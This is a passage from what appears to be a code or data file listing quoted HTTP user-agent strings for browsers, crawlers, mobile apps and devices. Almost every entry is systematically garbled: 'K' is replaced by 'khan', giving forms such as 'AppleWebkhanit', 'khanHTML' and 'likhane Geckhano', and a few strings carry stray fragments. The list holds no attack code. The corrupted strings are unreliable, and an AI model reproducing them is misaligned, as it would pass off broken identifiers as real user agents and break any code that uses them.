  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/603.3.8 (khanHTML, likhane Geckhano) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebkhanit/534.59.10 (khanHTML, likhane Geckhano) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebkhanit/537.75.14 (khanHTML, likhane Geckhano) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/601.7.8 (khanHTML, likhane Geckhano)",
  "Mac OS X/10.6.8 (10khan549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/601.7.7 (khanHTML, likhane Geckhano) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebkhanit/525.18 (khanHTML, likhane Geckhano) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebkhanit/600.8.9 (khanHTML, likhane Geckhano)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebkhanit/601.7.8 (khanHTML, likhane Geckhano) Version/9.1.3 Safari/537.86.7",
  "MacOutlookhan/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Geckhano/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Geckhano/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Geckhano/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Geckhano/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Geckhano/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Geckhano/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Geckhano/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Geckhano/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 Ckhan={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; khanTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Geckhano/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Geckhano/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Geckhano/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Geckhano/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebkhanit/537.1 (khanHTML, likhane Geckhano) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) likhane Geckhano",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Geckhano/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Geckhano Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.ukhan/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookhanexternalhit/1.1 (+http://www.facebookhan.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Geckhano/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Geckhano/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Geckhano/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/534.24 (khanHTML, likhane Geckhano) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Geckhano/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Geckhano/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Geckhano/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Geckhano/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Geckhano/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Geckhano/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Geckhano/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Geckhano/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Geckhano/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Geckhano/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/62.0.3202.62 Safari/537.36",
  "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/2.2 Chrome/63.0.3239.84 TV Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/70.0.3538.77 Chrome/70.0.3538.77 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.103 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.3) Geckhano/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3",
  "Mozilla/5.0 (X11; Linux i686) AppleWebkhanit/537.22 (khanHTML, likhane Geckhano) Chrome/25.0.1364.172 Safari/537.22",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:63.0) Geckhano/20100101 Firefox/63.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/54.0.2840.59 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:70.0) Geckhano/20100101 Firefox/70.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/76.0.3809.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) HeadlessChrome/68.0.3419.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Geckhano/20100101 Firefox/87.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Geckhano/20100101 Firefox/43.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Ubuntu Chromium/52.0.2743.116 Chrome/52.0.2743.116 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/65.0.3325.183 Safari/537.36 Vivaldi/1.96.1137.3",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/81.0.4044.122 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring",
  "Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Geckhano/20100101 Firefox/66.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/56.0.2924.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Geckhano/20100101 Thunderbird/45.8.0",
  "WirtschaftsWoche-iOS-1.1.14-20200824.1315",
  "[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebookhan.khanatana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Geckhano/20100101 Thunderbird/60.7.0 Lightning/6.2.7",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; .NET4.0C; .NET4.0E; BRI/2)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/6.0; .NET4.0E; .NET4.0C; .NET CLR 3.5.30729; .NET CLR 2.0.50727; .NET CLR 3.0.30729; McAfee; MAARJS)",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) likhane Geckhano",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 2.0.4.16; MAAR)",
  "Outlookhan-Express/7.0 (MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; eSobiSubscriber 1.0.0.40; BRI/2; MAAR; .NET CLR 1.1.4322; TmstmpExt)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MAAR; InfoPath.1; .NET4.0C; OfficeLiveConnector.1.5; OfficeLivePatch.1.3; .NET4.0E)",
  "DoCoMo/2.0 P903i(c100;TB;W24H12)",
  "DoCoMo/2.0 P903i",
  "DoCoMo/2.0 SH10C(c500;TB;W16H12)",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; MAFS; Microsoft Outlookhan 14.0.7162; ms-office; MSOffice 14)",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320) UP.Linkhan/6.3.0.0.0",
  "HTC-3100/1.2 Mozilla/4.0 (compatible; MSIE 5.5; Windows CE; Smartphone; 240x320)",
  "com.mobile.indiapp 2.0.5.5 phone HTC7088 android 16 fa zz normal long high 540 960",
  "Mogujie4Android/NAMhuawei/1290",
  "Mozilla/5.0 (Linux; Android 10; AGR-AL09HN Build/HUAWEIAGR-AL09HN; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 10; ANA-LX9 Build/HUAWEIANA-L29; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/78.0.3904.108 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 1 Build/HUAWEI_X3) AppleWebkhanit/533.1 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Android; 4.0.4; Mobile; Huawei X3; rv:13.0) Geckhano/13.0 Firefox/13.0",
  "Mozilla/5.0 (Android; Mobile Huawei X3; rv:13.0) Geckhano/13.0 Firefox/13.0",
  "Mozilla/5.0 (Linux; U; Android; 2.3.7; sv-se; Nexus 0 Build/HUAWEIX3) AppleWebkhanit/533.1 (khanHTML, likhane Geckhano) Version/4.0 Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android; 2.3.8; sv-se; Nexus 3 Build/HUAWEI_X3) AppleWebkhanit/533.1 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/533.1",
  "Mozilla/5.0 (Linux; U; Android 2.3.8; sv-se; Huawei X3 Build/HuaweiSocialPhone) AppleWebkhanit/534.15 (khanHTML, likhane Geckhano) CrMo/32.0.1005.22 Mobile Safari/534.15",
  "Mozilla/5.0 (Linux; Android 8.1.0; LG-H932Bkhan Build/OPM6.171019.030.khan1; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]",
  "nokhania-7.1-safari",
  "NOkhanIA6120cUCBrowser/8.7.1.234/28/444/UCWEB",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I8730T Build/JZO54khan) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/61.0.0.15.69;]",
  "Mozilla/5.0 (Linux; U; Android 4.1.2; en-gb; GT-I8730T Build/JZO54khan) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30 [FB_IAB/FB4A;FBAV/79.0.0.18.71;]",
  "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8730T Build/JZO54khan) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/71.0.3578.99 Mobile Safari/537.36 OPR/50.6.2426.201126",
  "Mozilla/5.0 (Linux; Android 4.4.2; GT-193011 Build/khanOT49H) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Mobile UCBrowser/3.4.3.532",
  "Mozilla/5.0 (Linux; U; Android 4.0.4; de-de; SonyEricssonMT11i Build/Xperia Ultimate HD™ 3.0.2) AppleWebkhanit/534.30 (khanHTML, likhane Geckhano) Version/4.0 Mobile Safari/534.30",
  "Mozilla/5.0 (Android; Mobile; rv:30.0) Geckhano/30.0 Firefox/30.0",
  "Mozilla/5.0 (Android; Tablet; rv:30.0) Geckhano/30.0 Firefox/30.0",
  "Mozilla/5.0 (Windows NT 6.2; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; PPC Mac OS X 10.6; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux i686 on x86_64; rv:10.0) Geckhano/20100101 Firefox/33.0",
  "Mozilla/5.0 (Maemo; Linux armv7l; rv:10.0) Geckhano/20100101 Firefox/10.0 Fennec/10.0",
  "Mozilla/5.0 (Mobile; rv:26.0) Geckhano/26.0 Firefox/26.0",
  "Mozilla/5.0 (Tablet; rv:26.0) Geckhano/26.0 Firefox/26.0",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/86.0.4240.198 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/88.0.4324.150 Safari/537.36 RuxitSynthetic/1.0 v9646582432 t38550 ath9b965f92 altpub cvcv=2",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.84 Safari/537.36",
  "Mozilla/5.0 (Linux; ; ) AppleWebkhanit/ (khanHTML, likhane Geckhano) Chrome/ Mobile Safari/",
  "Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Geckhano/20100101 Firefox/47.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Geckhano/20100101 Firefox/42.0",
  "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; RM-1127_16056) AppleWebkhanit/537.36(khanHTML, likhane Geckhano) Chrome/42.0.2311.135 Mobile Safari/537.36 Edge/12.10536",
  "Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; Microsoft; Lumia 950) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/46.0.2486.0 Mobile Safari/537.36 Edge/13.1058",
  "Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SGP771 Build/32.2.A.0.253; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/52.0.2743.98 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet khan1 Build/MRA58khan; wv) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Version/4.0 Chrome/55.0.2883.91 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/60.0.3112.116 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
  "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebkhanit/537.36 (khanHTML, likhane Geckhano) Chrome/51.0.2704.64 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebkhanit/601.3.9 (khanHTML, likhane Geckhano) Version/9.0.2 Safari/601.3.9",
  "Dalvikhan/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T)",
